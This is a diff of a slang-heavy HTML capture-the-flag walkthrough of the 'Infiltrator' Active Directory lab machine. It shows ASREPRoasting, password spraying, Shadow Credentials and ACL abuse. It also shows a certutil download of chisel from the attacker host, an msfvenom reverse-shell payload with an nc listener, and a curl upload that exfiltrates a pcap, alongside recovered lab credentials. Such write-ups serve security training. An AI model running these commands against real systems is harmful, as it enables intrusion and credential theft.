@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width,initial-scale=1">
-    <meta name="turbo-cache-control" content="no-cache" data-turbo-track="reload" data-track-token="3.11.0.807375038140">
+    <meta name="turbo-cache-control" content="no-cache" data-turbo-track="reload" data-track-token="3.11.0.807378339601">
 
     <!-- See retype.com -->
     <meta name="generator" content="Retype 3.11.0">
@@ -32,12 +32,12 @@
 
     <script data-cfasync="false">(function(){var cl=document.documentElement.classList,ls=localStorage.getItem("retype_scheme"),hd=cl.contains("dark"),hl=cl.contains("light"),wm=window.matchMedia&&window.matchMedia("(prefers-color-scheme: dark)").matches;if(ls==="dark"||(!ls&&wm&&!hd&&!hl)){cl.remove("light");cl.add("dark")}else if(ls==="light"||(!ls&&!wm&&!hd&&!hl)){cl.remove("dark");cl.add("light")}})();</script>
 
-    <link href="../../../../resources/css/retype.css?v=3.11.0.807375038140" rel="stylesheet">
+    <link href="../../../../resources/css/retype.css?v=3.11.0.807378339601" rel="stylesheet">
 
-    <script data-cfasync="false" src="../../../../resources/js/config.js?v=3.11.0.807375038140" data-turbo-eval="false" defer></script>
+    <script data-cfasync="false" src="../../../../resources/js/config.js?v=3.11.0.807378339601" data-turbo-eval="false" defer></script>
     <script data-cfasync="false" src="../../../../resources/js/retype.js?v=3.11.0" data-turbo-eval="false" defer></script>
-    <script id="lunr-js" data-cfasync="false" src="../../../../resources/js/lunr.js?v=3.11.0.807375038140" data-turbo-eval="false" defer></script>
-    <script id="prism-js" data-cfasync="false" src="../../../../resources/js/prism.js?v=3.11.0.807375038140" defer></script>
+    <script id="lunr-js" data-cfasync="false" src="../../../../resources/js/lunr.js?v=3.11.0.807378339601" data-turbo-eval="false" defer></script>
+    <script id="prism-js" data-cfasync="false" src="../../../../resources/js/prism.js?v=3.11.0.807378339601" defer></script>
 </head>
 <body>
     <div id="retype-app" class="relative text-base antialiased text-base-text bg-base-bg font-body">
@@ -184,7 +184,7 @@
     <div><a href="../../../../categories/windows/">Windows</a>,&nbsp;</div>
     <div><a href="../../../../categories/active-directory/">Active-Directory</a></div>
     <div class="mx-2">&#9679;</div>
-    <div class="flex items-center shrink-0">Published&nbsp;<span>2025-08-02</span></div>
+    <div class="flex items-center shrink-0">Published&nbsp;<span>2025-08-01</span></div>
 </div>
 
 <p><figure class="content-center">
@@ -205,8 +205,7 @@
         <span>Enumeration</span>
     </h2>
 </doc-anchor-target>
-<p>I ain’t wastin&#x27; time with your granddaddy’s nmap scan — nah, we already know this box be bustin’ that Active Directory life, so we skip the foreplay and go raw into <strong>user enumeration</strong>.</p>
-<p>First, we rip a list of names straight off the company site like it’s LinkedIn recon but with zero professionalism and maximum goblin energy (we be lootin&#x27;).</p>
+<p>I ain’t wastin&#x27; time with your granddaddy’s nmap scan — nah, we already know this box be bustin’ that Active Directory life, so we skip the foreplay and go raw into <strong>user enumeration</strong>. First, we rip a list of names straight off the company site like it’s LinkedIn recon but with zero professionalism and maximum goblin energy (we be lootin&#x27;).</p>
 <div class="codeblock-wrapper"><doc-codeblock>
 <pre translate="no" class="language-none"><code v-pre class="language-none">David Anderson
 Olivia Martinez
@@ -242,7 +241,7 @@ Version: v1.0.3 (9dad6e1) - 09/01/24 - Ronnie Flathers @ropnop
 2024/09/01 09:45:33 &gt;  [+] VALID USERNAME:	 e.rodriguez@INFILTRATOR.HTB
 2024/09/01 09:45:33 &gt;  [+] VALID USERNAME:	 l.clark@INFILTRATOR.HTB</code></pre>
 </doc-codeblock></div>
-<p>Alright, we cracked the username code, and yeah, we could spam it with name lists like a desperate Tinder bot, but tossing in <code v-pre>j.smith-x98800.txt</code> was a total flop, dry as the Sahara. So, we’re calling it: this is our final crew.</p>
+<p>Alright, we cracked the username code, and yeah, we could spam it with name lists like a desperate Tinder bot, but tossing in <code v-pre>j.smith-x98800.txt</code> was a total flop. So, we’re calling it: this is our final crew.</p>
 <div class="codeblock-wrapper"><doc-codeblock>
 <pre translate="no" class="language-none"><code v-pre class="language-none">administrator@INFILTRATOR.HTB
 d.anderson@INFILTRATOR.HTB
@@ -253,7 +252,7 @@ m.harris@INFILTRATOR.HTB
 e.rodriguez@INFILTRATOR.HTB
 l.clark@INFILTRATOR.HTB</code></pre>
 </doc-codeblock></div>
-<p>Time to get greasy with <strong>ASREPRoasting</strong>. We send a lil’ love letter to the domain like “hey, gimme them sweet sweet hashies” — and boom, one account responds like “sure babe, no pre-auth needed!”. Yes my dude!</p>
+<p>Time to get greasy with <strong>ASREPRoasting</strong>. We send a lil’ love letter to the domain like “hey, gimme them sweet sweet hashies” — and boom, one account responds like “sure babe, no pre-auth needed!”. Yessir!</p>
 <div class="codeblock-wrapper"><doc-codeblock>
 <pre translate="no" class="language-shell-session"><code v-pre class="language-shell-session">$ GetNPUsers.py INFILTRATOR.HTB/ -dc-ip 10.10.11.31 -no-pass -usersfile all_ad_users -format hashcat
 Impacket v0.11.0 - Copyright 2023 Fortra
@@ -304,6 +303,12 @@ SMB                      10.10.11.31   445    DC01             K.turner         
 <blockquote>
 <p><em>“You get a login! YOU get a login! ERRBODY LOGGING IN!”</em></p>
 </blockquote>
+<div class="codeblock-wrapper"><doc-codeblock>
+<pre translate="no" class="language-shell-session"><code v-pre class="language-shell-session">$ nxc smb dc01.infiltrator.htb -u users.txt -p 'MessengerApp@Pass!' --continue-on-success
+SMB         10.10.11.31   445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:infiltrator.htb) (signing:True) (SMBv1:False)
+SMB         10.10.11.31   445    DC01             [-] infiltrator.htb\k.turner:MessengerApp@Pass! STATUS_LOGON_FAILURE
+SMB         10.10.11.31   445    DC01             [-] infiltrator.htb\d.anderson:MessengerApp@Pass! STATUS_LOGON_FAILURE</code></pre>
+</doc-codeblock></div>
 <p>But then... Curveball. We see that both <code v-pre>m.harris</code> and <code v-pre>d.anderson</code> get the message <code v-pre>STATUS_ACCOUNT_RESTRICTION</code>. Excuse me??? Microsoft really out here like:</p>
 <blockquote>
 <p>“Woah woah woah, hold up... you <em>do</em> have the right password, but uhh... no entry. Try again when your chakras are aligned or whatever.”</p>
@@ -311,10 +316,10 @@ SMB                      10.10.11.31   445    DC01             K.turner         
 <p>This ain&#x27;t a wrong password, nah. This is <strong>“you got it, but you still ain&#x27;t allowed.”</strong> That’s the cyber equivalent of your key working in the lock but some dude inside just holding the door shut whispering, <em>“not today, boi.”</em></p>
 <p>So yeah — creds probably valid, but maybe they’re disabled, locked out, got logon restrictions, or just spiritually unavailable. Either way, these accounts are on some <span class="docs-emoji">&#x2728;</span>emotional boundary<span class="docs-emoji">&#x2728;</span> arc and we gotta pivot.</p>
 <doc-anchor-target id="bloodhound">
-    <h2>
+    <h3>
         <doc-anchor-trigger class="header-anchor-trigger" to="#bloodhound">#</doc-anchor-trigger>
         <span>Bloodhound</span>
-    </h2>
+    </h3>
 </doc-anchor-target>
 <p>So now that we got creds for <code v-pre>l.clark</code> (shoutout to my boy k.turner), we unleash <strong>BloodHound</strong> to sniff out the domain like a digital truffle pig.</p>
 <div class="codeblock-wrapper"><doc-codeblock>
@@ -333,10 +338,7 @@ Impacket v0.11.0 - Copyright 2023 Fortra
 <div class="codeblock-wrapper"><doc-codeblock>
 <pre translate="no" class="language-shell-session"><code v-pre class="language-shell-session">$ nxc smb infiltrator.htb -d infiltrator.htb -u 'd.anderson' -p 'WAT?watismypass!' -k</code></pre>
 </doc-codeblock></div>
-<p>But hold up... BloodHound whispers in our ear again:</p>
-<blockquote>
-<p><strong>“psst... <code v-pre>d.anderson</code> got <code v-pre>GenericAll</code> over the Marketing Digital OU...”</strong></p>
-</blockquote>
+<p>But hold up... BloodHound whispers in our ear again: <strong>“psst... <code v-pre>d.anderson</code> got <code v-pre>GenericAll</code> over the Marketing Digital OU...”</strong></p>
 <p><figure class="content-center">
     <img src="../../../../assets/images/writeups/infiltrator/bh-anderson.png" alt="" class="rounded-image-rounded border-image-border border-image-border-width" />
     <figcaption class="caption"></figcaption>
@@ -351,8 +353,7 @@ Impacket v0.11.0 - Copyright 2023 Fortra
 <pre translate="no" class="language-shell-session"><code v-pre class="language-shell-session">$ bloodyAD --host dc01.infiltrator.htb -d infiltrator.htb -k add genericAll 'OU=MARKETING DIGITAL,DC=INFILTRATOR,DC=HTB' 'l.clark'
 [+] l.clark has now GenericAll on OU=MARKETING DIGITAL,DC=INFILTRATOR,DC=HTB</code></pre>
 </doc-codeblock></div>
-<p>That’s it. <strong>l.clark just went from running marketing reports to rewriting destiny.</strong><br />
-Let the ACL shenanigans commence.</p>
+<p>That’s it, <strong>l.clark just went from running marketing reports to rewriting destiny.</strong> Let the ACL shenanigans commence.</p>
 <doc-anchor-target id="user">
     <h2>
         <doc-anchor-trigger class="header-anchor-trigger" to="#user">#</doc-anchor-trigger>
@@ -369,7 +370,6 @@ Let the ACL shenanigans commence.</p>
 </figure>
 </p>
 <p>So how do we get spicy with this? We’re about to hit <code v-pre>e.rodriguez</code> with <strong>Shadow Credentials</strong>—basically stuffing a fake cert into his account like it’s a USB Rubber Ducky in a coffee shop laptop.</p>
-<p>This lets us <strong>Pass the Certificate</strong> using PKINIT, snag a TGT, and suddenly we’re <code v-pre>e.rodriguez</code> now. It’s like Face/Off but for Active Directory. Kerberos never saw it coming.</p>
 <div class="codeblock-wrapper"><doc-codeblock>
 <pre translate="no" class="language-shell-session"><code v-pre class="language-shell-session">$ bloodyAD --host dc01.infiltrator.htb -d infiltrator.htb -u 'l.clark' -p 'WAT?watismypass!' add shadowCredentials 'e.rodriguez'
 [+] KeyCredential generated with following sha256 of RSA key: 21db2d646e4fd3177d1c18717161109ed382cae2e6ed5529cf1589e41a38ad3c
@@ -378,9 +378,11 @@ No outfile path was provided. The certificate(s) will be stored with the filenam
 [+] Saved PEM private key at path: LN43uoBF_priv.pem
 A TGT can now be obtained with https://github.com/dirkjanm/PKINITtools
 Run the following command to obtain a TGT:
-python3 PKINITtools/gettgtpkinit.py -cert-pem LN43uoBF_cert.pem -key-pem LN43uoBF_priv.pem infiltrator.htb/e.rodriguez LN43uoBF.ccache
-
-$ python3 PKINITtools/gettgtpkinit.py -cert-pem LN43uoBF_cert.pem -key-pem LN43uoBF_priv.pem infiltrator.htb/e.rodriguez LN43uoBF.ccache
+python3 PKINITtools/gettgtpkinit.py -cert-pem LN43uoBF_cert.pem -key-pem LN43uoBF_priv.pem infiltrator.htb/e.rodriguez LN43uoBF.ccache</code></pre>
+</doc-codeblock></div>
+<p>This lets us <strong>Pass the Certificate</strong> using PKINIT, snag a TGT, and suddenly we’re <code v-pre>e.rodriguez</code> now. It’s like Face/Off but for Active Directory. Kerberos never saw it coming.</p>
+<div class="codeblock-wrapper"><doc-codeblock>
+<pre translate="no" class="language-shell-session"><code v-pre class="language-shell-session">$ python3 PKINITtools/gettgtpkinit.py -cert-pem LN43uoBF_cert.pem -key-pem LN43uoBF_priv.pem infiltrator.htb/e.rodriguez LN43uoBF.ccache
 2024-09-01 12:36:01,801 minikerberos INFO     Loading certificate and key from file
 INFO:minikerberos:Loading certificate and key from file
 2024-09-01 12:36:01,812 minikerberos INFO     Requesting TGT
@@ -421,14 +423,18 @@ b02e97f2fdb5c3d36f77375383449e56</code></pre>
 [logging]
 #       kdc = CONSOLE</code></pre>
 </doc-codeblock></div>
-<p>We add ourself to the target group and force a password change.</p>
+<p>If you are not a scrub like me, you could have just generated this with <code v-pre>nxc</code>.</p>
+<div class="codeblock-wrapper"><doc-codeblock>
+<pre translate="no" class="language-shell-session"><code v-pre class="language-shell-session">$ nxc smb infiltrator.htb --generate-krb5-file krb5.conf</code></pre>
+</doc-codeblock></div>
+<p>Now we add ourself to the target group and force a password change.</p>
 <div class="codeblock-wrapper"><doc-codeblock>
 <pre translate="no" class="language-shell-session"><code v-pre class="language-shell-session">$ bloodyAD --host 10.10.11.31 -d infiltrator.htb -u &quot;e.rodriguez&quot; -p ':b02e97f2fdb5c3d36f77375383449e56' add groupMember 'CHIEFS MARKETING' 'e.rodriguez'
 [+] e.rodriguez added to CHIEFS MARKETING
 
 $ bloodyAD --host 10.10.11.31 -d infiltrator.htb -u &quot;e.rodriguez&quot; -p ':b02e97f2fdb5c3d36f77375383449e56' set password 'm.harris' 'Pwn3d_by_ACLs!'</code></pre>
 </doc-codeblock></div>
-<p>Since <code v-pre>m.harris</code> is playing the <em>protected user</em> card like the VIP of Active Directory, we gotta do the whole “request a TGT and flex Kerberos auth” dance again.</p>
+<p>Since <code v-pre>m.harris</code> is playing the <em>protected user</em> card like he the president of Active Directory, we gotta do the whole “request a TGT and flex Kerberos auth” dance again.</p>
 <p>No password? No problem — just slide into Evil-WinRM using the magic <code v-pre>--realm</code> flag with your shiny ticket instead of a boring old password. It’s like showing up to the party with a golden invite while everyone else is stuck outside sweating their creds.</p>
 <div class="codeblock-wrapper"><doc-codeblock>
 <pre translate="no" class="language-shell-session"><code v-pre class="language-shell-session">$ getTGT.py 'infiltrator.htb/m.harris:NewP@ssword2024' -dc-ip 10.10.11.31
@@ -464,10 +470,10 @@ MySQL_data=data
 Backup=backup</code></pre>
 </doc-codeblock></div>
 <doc-anchor-target id="unintended-path">
-    <h2>
+    <h3>
         <doc-anchor-trigger class="header-anchor-trigger" to="#unintended-path">#</doc-anchor-trigger>
         <span>Unintended Path</span>
-    </h2>
+    </h3>
 </doc-anchor-target>
 <p>Since the database is running with admin powers like it’s the kingpin of this system, we just casually port-forward that juicy MySQL on port 14406 and grab the root flag like a boss.<br />
 Dropped Chisel on the target because who doesn’t love a good reverse tunnel flex?</p>
@@ -481,10 +487,10 @@ MariaDB [outputwall]&gt; select LOAD_FILE(&quot;C:/Users/Administrator/Desktop/r
 </doc-codeblock></div>
 <p>Easy mode activated — root flag, served on a silver platter. Now buckle up, because it’s time to dive into the <em>actual</em> intended way to get root. Spoiler: it’s not this chill.</p>
 <doc-anchor-target id="intended-path-windows-client-needed">
-    <h2>
+    <h3>
         <doc-anchor-trigger class="header-anchor-trigger" to="#intended-path-windows-client-needed">#</doc-anchor-trigger>
         <span>Intended Path (Windows Client needed)</span>
-    </h2>
+    </h3>
 </doc-anchor-target>
 <p>From here on out, we’re hopping into a Windows VM because… well, reasons. Spoiler alert: it gets messy and way more fun. If you still have the TGT ticket for <code v-pre>m.harris</code> chilling somewhere, just yank it over and convert to a Kirbi file like a pro hacker. But nah, I’m gonna show you how to climb back up from <code v-pre>e.rodriguez</code> to <code v-pre>m.harris</code> — Windows style.</p>
 <div class="flex mb-6">
@@ -514,8 +520,7 @@ PS C:\&gt; C:\Tools\bloodyAD.exe --host 10.10.11.31 -d infiltrator.htb -u 'e.rod
 PS C:\&gt; python C:\Tools\Python\getTGT.py 'infiltrator.htb/m.harris:Pwn3d_by_ACLs!' -dc-ip 10.10.11.31
 [*] Saving ticket in m.harris.ccache</code></pre>
 </doc-codeblock></div>
-<p>Next up, before Kerberos can party on our Windows attack VM, we gotta join it to the domain.  Hop into: <code v-pre>Settings &gt; Accounts &gt; Access work or school &gt; Connect</code><br />
-Punch in <code v-pre>infiltrator.htb</code> as the domain and log in with any domain account (e.g. <code v-pre>l.clark</code>).</p>
+<p>Next up, before Kerberos can party on our Windows attack VM, we gotta join it to the domain.  Hop into: <code v-pre>Settings &gt; Accounts &gt; Access work or school &gt; Connect</code>. Punch in <code v-pre>infiltrator.htb</code> as the domain and log in with any domain account (e.g. <code v-pre>l.clark</code>).</p>
 <p>Another pro tip: Make sure your VPN interface’s DHCP server points to the DC IP (10.10.11.31), otherwise Kerberos throws a hissy fit.</p>
 <p>If it asks to add an account, just politely decline. Restart your VM, sign in as a <strong>local user</strong>, and don’t forget to slap that firewall off — this isn’t a hotel lobby.</p>
 <p><figure class="content-center">
@@ -525,7 +530,7 @@ Punch in <code v-pre>infiltrator.htb</code> as the domain and log in with any do
 </p>
 <p>Next we can convert the <code v-pre>ccache</code> file to Kirbi and inject our ticket into memory using Rubeus.</p>
 <div class="codeblock-wrapper"><doc-codeblock>
-<pre translate="no" class="language-shell-session"><code v-pre class="language-shell-session">PS C:\&gt; python C:\Tools\Python\ticketConverter.py .\m.harris.ccache m.harris.kirbi
+<pre translate="no" class="language-powershell"><code v-pre class="language-powershell">PS C:\&gt; python C:\Tools\Python\ticketConverter.py .\m.harris.ccache m.harris.kirbi
 [*] converting ccache to kirbi...
 [+] done
 
@@ -533,25 +538,30 @@ PS C:\&gt; C:\Tools\Rubeus.exe ptt /ticket:m.harris.kirbi</code></pre>
 </doc-codeblock></div>
 <p>Aight we’re in. Since <code v-pre>m.harris</code> got that sweet Remote Management privilege, we Kerberos-yeet ourselves into a WinRM shell like some kind of enterprise wizard. Once inside, it’s business as usual: HTTP server up, chisel in hand, and we&#x27;re tunneling like it’s 1999.</p>
 <div class="codeblock-wrapper"><doc-codeblock>
-<pre translate="no" class="language-shell-session"><code v-pre class="language-shell-session">PS C:\&gt; python -m http.server
+<pre translate="no" class="language-powershell"><code v-pre class="language-powershell">PS C:\&gt; python -m http.server
 PS C:\&gt; winrm set winrm/config/client '@{TrustedHosts=&quot;*&quot;}'
 PS C:\&gt; Enter-PSSession -ComputerName dc01.infiltrator.htb -Authentication Kerberos
 [dc01.infiltrator.htb]: PS C:\Users\M.harris\Documents&gt; certutil -f -urlcache http://10.10.14.7:8000/chisel.exe C:\Windows\Temp\chisel.exe</code></pre>
 </doc-codeblock></div>
 <p>Drop the chisel. Tunnel the ports. Talk to the DB like a boss.</p>
 <div class="codeblock-wrapper"><doc-codeblock>
-<pre translate="no" class="language-shell-session"><code v-pre class="language-shell-session">PS C:\&gt; C:\Tools\chisel.exe server --reverse
+<pre translate="no" class="language-powershell"><code v-pre class="language-powershell">PS C:\&gt; C:\Tools\chisel.exe server --reverse
 [dc01.infiltrator.htb]: PS C:\Windows\Temp&gt; .\chisel.exe client 10.10.14.7:8080 R:14121:127.0.0.1:14406</code></pre>
 </doc-codeblock></div>
-<p>Inside the <code v-pre>ot_wall_posts</code> table, we uncover some juicy lore straight from the dev diaries:</p>
+<p>Inside the <code v-pre>ot_wall_posts</code>, we uncover some juicy lore straight from the dev diaries:</p>
 <div class="codeblock-wrapper"><doc-codeblock>
 <pre translate="no" class="language-none"><code v-pre class="language-none">Hey team, I\'m here! In this screenshot, I\'ll guide you through using the app UserExplorer.exe. It works seamlessly with dev credentials, but remember, it\'s versatile and functions with any credentials. Currently, we\'re exploring the default option. Stay tuned for more updates!\n\n\&quot;UserExplorer.exe -u m.harris -p D3v3l0p3r_Pass@1337! -s M.harris
 
 Hey team,\n\nWe\'ve identified a security concern: some users and our domain (dc01.infiltrator.htb) have pre-authentication disabled on kerberos. \nNo need to panic! Our vigilant team is already on it and will work diligently to fix this. In the meantime, stay vigilant and be cautious about any potential security risks</code></pre>
 </doc-codeblock></div>
+<p><figure class="content-center">
+    <img src="../../../../assets/images/writeups/infiltrator/om-ot-wall.png" alt="" class="rounded-image-rounded border-image-border border-image-border-width" />
+    <figcaption class="caption"></figcaption>
+</figure>
+</p>
 <p>Thanks for the creds, mystery dev. Now, according to OutputMessenger’s official docs (yes, we actually read those), the app needs a buffet of ports open to do its thing. Let’s open the floodgates:</p>
 <div class="codeblock-wrapper"><doc-codeblock>
-<pre translate="no" class="language-shell-session"><code v-pre class="language-shell-session">PS C:\&gt; Invoke-Command -ScriptBlock { C:\Windows\Temp\chisel.exe client 10.10.14.7:8080 R:14121:127.0.0.1:14121 R:14122:127.0.0.1:14122 R:14123:127.0.0.1:14123 R:14124:127.0.0.1:14124 } -Session $Session
+<pre translate="no" class="language-powershell"><code v-pre class="language-powershell">PS C:\&gt; Invoke-Command -ScriptBlock { C:\Windows\Temp\chisel.exe client 10.10.14.7:8080 R:14121:127.0.0.1:14121 R:14122:127.0.0.1:14122 R:14123:127.0.0.1:14123 R:14124:127.0.0.1:14124 } -Session $Session
 
 2024/09/06 07:22:02 client: Connected (Latency 523.4µs)</code></pre>
 </doc-codeblock></div>
@@ -560,16 +570,13 @@ Hey team,\n\nWe\'ve identified a security concern: some users and our domain (dc
 <pre translate="no" class="language-none"><code v-pre class="language-none">Hello everyone 😃
 There have been some complaints regarding the stability of the &quot;Output Messenger&quot; application. In case you encounter any issues, please make sure you are using a Windows client. The Linux version is outdated.</code></pre>
 </doc-codeblock></div>
-<p>Translation:</p>
-<blockquote>
-<p>“Linux users? Sorry babes, go get a real OS.”</p>
-</blockquote>
+<p>Translation: “Linux users? Sorry babes, go get a real OS.”</p>
 <p>So yeah, looks like we’re installing the Windows client if we want this app to actually function. Time to bootleg some enterprise nostalgia.</p>
 <doc-anchor-target id="outputmessenger-windows-client">
-    <h3>
+    <h4>
         <doc-anchor-trigger class="header-anchor-trigger" to="#outputmessenger-windows-client">#</doc-anchor-trigger>
         <span>OutputMessenger Windows Client</span>
-    </h3>
+    </h4>
 </doc-anchor-target>
 <p>So we spin up the Windows OutputMessenger client (don’t ask how we still trust this thing), login as our dev-king <code v-pre>m.harris</code> using the creds from the earlier DB leak: <code v-pre>D3v3l0p3r_Pass@1337!</code></p>
 <p><figure class="content-center">
@@ -629,7 +636,7 @@ print(decrypt_string(key,decrypt_string(key, cipher_text)))</code></pre>
 </doc-codeblock></div>
 <p>We recover the password as <code v-pre>WinRm@$svc^!^P</code>. Now we can also WinRM with this user, which saves us some headaches of resetting passwords and grabbing TGTs.</p>
 <div class="codeblock-wrapper"><doc-codeblock>
-<pre translate="no" class="language-shell-session"><code v-pre class="language-shell-session">PS C:\&gt; $SecPassword = ConvertTo-SecureString 'WinRm@$svc^!^P' -AsPlainText -Force
+<pre translate="no" class="language-powershell"><code v-pre class="language-powershell">PS C:\&gt; $SecPassword = ConvertTo-SecureString 'WinRm@$svc^!^P' -AsPlainText -Force
 PS C:\&gt; $Cred = New-Object System.Management.Automation.PSCredential('infiltrator.htb\winrm_svc', $SecPassword)
 PS C:\&gt; Enter-PSSession -Computername 10.10.11.31 -Authentication Negotiate -Credential $Cred</code></pre>
 </doc-codeblock></div>
@@ -652,7 +659,8 @@ Host: infiltrator.htb:14125</code></pre>
 </doc-codeblock></div>
 <p>Therefore we also need to forward port 14125 and send the following request.</p>
 <div class="codeblock-wrapper"><doc-codeblock>
-<pre translate="no" class="language-shell-session"><code v-pre class="language-shell-session">curl.exe -H 'Accept: application/json, text/javascript, */*;' -H 'API-KEY: 558R501T5I6024Y8JV3B7KOUN1A518GG' -H 'Host: infiltrator.htb:14125' http://localhost:14125/api/chatrooms/Chiefs_Marketing_chat
+<pre translate="no" class="language-powershell"><code v-pre class="language-powershell">PS C:\&gt; curl.exe -H 'Accept: application/json, text/javascript, */*;' -H 'API-KEY: 558R501T5I6024Y8JV3B7KOUN1A518GG' -H 'Host: infiltrator.htb:14125' http://localhost:14125/api/chatrooms/Chiefs_Marketing_chat
+
 {&quot;row&quot;:{&quot;room&quot;:&quot;Chiefs_Marketing_chat&quot;,&quot;roomusers&quot;:&quot;A.walker|0,O.martinez|0&quot;},&quot;success&quot;:true}</code></pre>
 </doc-codeblock></div>
 <p>Alright, we indeed see that Martinez is part of this chat room. In order to read the chat logs, we need to also find the <code v-pre>roomkey</code> according to the docs. We have to start looking for this on the DC. We log in as <code v-pre>winrm_svc</code> and find an <code v-pre>OM.db3</code> file in the <code v-pre>AppData</code> folder of this user. We download it and open it with a database viewer. In one of the tables we find the key.</p>
@@ -663,7 +671,7 @@ Host: infiltrator.htb:14125</code></pre>
 </p>
 <p>Now we can attempt to read the logs by specifying a date range.</p>
 <div class="codeblock-wrapper"><doc-codeblock>
-<pre translate="no" class="language-shell-session"><code v-pre class="language-shell-session">curl.exe -H 'Accept: application/json, text/javascript, */*;' -H 'API-KEY: 558R501T5I6024Y8JV3B7KOUN1A518GG' -H 'Host: localhost:14125' 'http://localhost:14125/api/chatrooms/logs?roomkey=20240220014618@conference.com&amp;fromdate=2024/02/01&amp;todate=2024/03/01'</code></pre>
+<pre translate="no" class="language-powershell"><code v-pre class="language-powershell">PS C:\&gt; curl.exe -H 'Accept: application/json, text/javascript, */*;' -H 'API-KEY: 558R501T5I6024Y8JV3B7KOUN1A518GG' -H 'Host: localhost:14125' 'http://localhost:14125/api/chatrooms/logs?roomkey=20240220014618@conference.com&amp;fromdate=2024/02/01&amp;todate=2024/03/01'</code></pre>
 </doc-codeblock></div>
 <p>At the bottom, we find the credentials for <code v-pre>o.martinez</code>.</p>
 <div class="codeblock-wrapper"><doc-codeblock>
@@ -673,16 +681,12 @@ Host: infiltrator.htb:14125</code></pre>
 <div class="codeblock-wrapper"><doc-codeblock>
 <pre translate="no" class="language-none"><code v-pre class="language-none">I'm getting random website pop-ups on my desktop every day at 09:00 AM. I suspect there's an issue with the app</code></pre>
 </doc-codeblock></div>
-<p>So martinez been cryin in the club (OM chat) like</p>
-<blockquote>
-<p>&quot;wahh my desktop opening random websites at 9AM <span class="docs-emoji">&#x1F62D;</span>&quot;</p>
-</blockquote>
-<p>Bro. you fr just told me you got <strong>task scheduler malware edition</strong> installed and running.</p>
+<p>So martinez been cryin in the club (OM chat) like &quot;wahh my desktop opening random websites at 9AM <span class="docs-emoji">&#x1F62D;</span>&quot;. Bro. you fr just told me you got <strong>task scheduler malware edition</strong> installed and running.</p>
 <p>From the application, there is a feature to run programs and open website on a designated time. When we try this out and for instance just launch the default browser application, it indeed opens on the local machine. Just a spicy lil feature called <strong>&quot;Scheduled Events&quot;</strong>, which basically goes:</p>
 <blockquote>
 <p>“hey, wanna open calc.exe on ur coworker&#x27;s PC at 3am? go for it.”</p>
 </blockquote>
-<p>I also noticed that Martinez always is in the idle state so maybe we can upload a reverse shell to the DC and execute it in the context of Martinez. Let&#x27;s try!</p>
+<p>I also noticed that Martinez always is in the idle state so maybe we can upload a reverse shell to the DC and execute it in the context of Martinez. Let&#x27;s try! Metasploit payload goes brrr...</p>
 <div class="codeblock-wrapper"><doc-codeblock>
 <pre translate="no" class="language-shell-session"><code v-pre class="language-shell-session">$ msfvenom -p windows/x64/shell_reverse_tcp lhost=10.10.14.7 lport=443 -f exe -o payload.exe
 
@@ -690,7 +694,7 @@ Host: infiltrator.htb:14125</code></pre>
 
 PS C:\&gt; C:\Tools\nc64.exe -nlvp 443</code></pre>
 </doc-codeblock></div>
-<p>Payload.exe goes brrr. Now I create a new event with a nearby time, logout and login as <code v-pre>k.turner</code> with pass <code v-pre>MessengerApp@Pass!</code> and wait. You also need to have the same binary in your local machine in order to create the event. Just make sure martinez stays online. If not? Cry harder, reset the box, and try again. Cuz when that scheduled payload hits, you&#x27;re not just in the room… <strong>you’re in his session.</strong></p>
+<p>Now I create a new event with a nearby time, logout and login as <code v-pre>k.turner</code> with pass <code v-pre>MessengerApp@Pass!</code> and wait. You also need to have the same binary in your local machine in order to create the event. Just make sure martinez stays online. If not? Cry harder, reset the box, and try again. Eventually you will get a shell bro.</p>
 <div class="flex mb-6">
     <div class="shrink-0 w-1.5 rounded-tl-lg rounded-bl-lg bg-callout-info"></div>
     <div class="flex w-full py-4 border border-l-0 rounded-tr-lg rounded-br-lg doc-callout bg-callout-base-bg border-callout-base-border" role="alert">
@@ -709,15 +713,14 @@ PS C:\&gt; C:\Tools\nc64.exe -nlvp 443</code></pre>
     </div>
 </div>
 <doc-anchor-target id="pcap-analysis-and-bitlocker-decrypt">
-    <h3>
+    <h4>
         <doc-anchor-trigger class="header-anchor-trigger" to="#pcap-analysis-and-bitlocker-decrypt">#</doc-anchor-trigger>
         <span>PCAP Analysis and BitLocker Decrypt</span>
-    </h3>
+    </h4>
 </doc-anchor-target>
-<p>So we pokin’ around in Martinez’s AppData, and guess what man’s got tucked away in the digital sock drawer? A juicy lil <code v-pre>.pcapng</code> file sittin’ there like it didn’t just witness a whole cybercrime. File’s named <code v-pre>network_capture_2024.pcapng</code>—real subtle.</p>
-<p>Naturally, we snatch it. Set up a quick n’ dirty Python upload server on our end, then slap that file across the internet like we’re trading bootleg mixtapes.</p>
+<p>So we pokin’ around in Martinez’s AppData, and guess what man’s got tucked away in the digital sock drawer? A juicy lil <code v-pre>.pcapng</code> file sittin’ there like it didn’t just witness a whole cybercrime. File’s named <code v-pre>network_capture_2024.pcapng</code>—real subtle. Naturally, we snatch it. Set up a quick n’ dirty Python upload server on our end, then slap that file across the internet like we’re trading bootleg mixtapes.</p>
 <div class="codeblock-wrapper"><doc-codeblock>
-<pre translate="no" class="language-none"><code v-pre class="language-none">python -m uploadserver
+<pre translate="no" class="language-shell-session"><code v-pre class="language-shell-session">$ python -m uploadserver
 PS C:\Users\O.martinez\AppData&gt; curl.exe http://10.10.14.7:8000/upload -F &quot;files=@network_capture_2024.pcapng&quot; -f &quot;token=helloworld&quot;</code></pre>
 </doc-codeblock></div>
 <p>Now inside the capture, we dig up two little digital treasures:</p>
@@ -725,12 +728,10 @@ PS C:\Users\O.martinez\AppData&gt; curl.exe http://10.10.14.7:8000/upload -F &qu
 <li>A sketchy-looking file labeled <code v-pre>BitLocker-backup.7z</code> (because encrypting your own encryption is totally normal, right?)</li>
 <li>A cleartext password floating inside an API call: <code v-pre>M@rtinez_P@ssw0rd!</code> dropped casually in a <code v-pre>change_auth_token</code> request. Like bro, you good?</li>
 </ol>
-<p>Armed with the creds, we RDP into Martinez’s box. Like legally? No. But efficiently? Absolutely.</p>
-<p>Anyway, this zip file’s got a password on it. Of course it does. But we ain’t scared of some password-protected nonsense. We hit it with that <code v-pre>zip2john</code> → <code v-pre>hashcat</code> combo and let RockYou do what RockYou does best.</p>
